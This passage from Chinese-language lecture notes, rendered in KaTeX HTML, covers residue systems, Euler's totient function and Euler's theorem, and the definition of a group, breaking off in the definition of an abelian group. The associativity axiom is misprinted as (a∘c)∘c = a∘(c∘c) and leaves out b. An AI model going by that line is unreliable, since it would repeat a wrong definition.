(2) 定理2：设m是正整数，整数a满足gcd(a,m)=1，b是任意整数。若x遍历模m的一个完全剩余系，则ax+b也遍历m的一个完全剩余系。<br />
(3)定理3：设 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m_1,m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是两个互素的正整数。如果x遍历<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">m_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的一个完全剩余系，y遍历 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的一个完全剩余系，则 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><mi>y</mi><mo>+</mo><msub><mi>m</mi><mn>2</mn></msub><mi>x</mi></mrow><annotation encoding="application/x-tex">m_1y+m_2x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span></span></span></span> 遍历 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m_1m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的一个完全剩余系。</p>
</li>
<li>
<p>简化剩余系<br />
(1)定理1：设m是正整数，整数a满足gcd(a,m)=1.若x遍历模m的一个简化剩余系，则ax也遍历模m的一个简化剩余系。<br />
(2)定理2：设 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m_1,m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是两个互素的正整数。如果x遍历<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">m_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的一个简化剩余系，y遍历 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的一个简化剩余系，则 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><mi>y</mi><mo>+</mo><msub><mi>m</mi><mn>2</mn></msub><mi>x</mi></mrow><annotation encoding="application/x-tex">m_1y+m_2x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span></span></span></span> 遍历 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mn>1</mn></msub><msub><mi>m</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">m_1m_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的一个简化剩余系。</p>
</li>
<li>
<p>欧拉定理<br />
(1)推论1：设m，n是两个互素的整数，则φ(mn)=φ(m)φ(n).<br />
(2)定理1：若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>e</mi><mn>1</mn></msub></msubsup><msubsup><mi>p</mi><mn>2</mn><msub><mi>e</mi><mn>2</mn></msub></msubsup><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msubsup><mi>p</mi><mi>k</mi><msub><mi>e</mi><mi>k</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">m=p_1^{e_1}p_2^{e_2}...p_k^{e_k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0533599999999999em;vertical-align:-0.3013079999999999em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7520519999999999em;"><span style="top:-2.3986920000000005em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1506600000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013079999999999em;"><span></span></span></span></span></span></span></span></span></span> ，则</p>
</li>
</ol>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mi>i</mi></msub></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">φ(m)=m\prod_{i=1}^{k} \left( 1-\frac{1}{p_i}\right)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p>
<pre><code>(3)定理2（欧拉定理）：设m是正整数，$r\in Z_m$ ,若gcd(r,m)=1,则$r^{φ(m)} ≡ 1 (mod m)$ 。
</code></pre>
<ol start="4">
<li>群：设G是一个具有代数运算 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∘</mo></mrow><annotation encoding="application/x-tex">\circ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord">∘</span></span></span></span> 非空集合，并且满足：<br />
(1)封闭性：G中任意两个元素做运算得到的结果仍属于G；<br />
(2)结合律：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo>∈</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">\forall a,b,c \in G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∀</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span></span></span></span> ,有</li>
</ol>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo>∘</mo><mi>c</mi><mo stretchy="false">)</mo><mo>∘</mo><mi>c</mi><mo>=</mo><mi>a</mi><mo>∘</mo><mo stretchy="false">(</mo><mi>c</mi><mo>∘</mo><mi>c</mi><mo stretchy="false">)</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">(a\circ c)\circ c = a\circ( c\circ c);
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mpunct">;</span></span></span></span></span></p>
<p>(3)有单位元：即G中存在一个元素e：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>a</mi><mo>∈</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">\forall a \in G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span></span></span></span>，有</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mo>∘</mo><mi>a</mi><mo>=</mo><mi>a</mi><mo>∘</mo><mi>e</mi><mo>=</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">e\circ a = a\circ e = a
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span></span></p>
<p>(4)有逆元：即对于任意 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>∈</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">a \in G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span></span></span></span>，存在一个元素 $a^{-1} \in G $，使得</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo>∘</mo><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo><mo>=</mo><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∘</mo><mi>a</mi><mo>=</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">(a\circ a^{-1}) = a^{-1}\circ a = e
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span></span></p>
<ol start="5">
<li>交换群：对于群G中的任意元素，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">a,b \in G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span></span></span></span>都有</li>
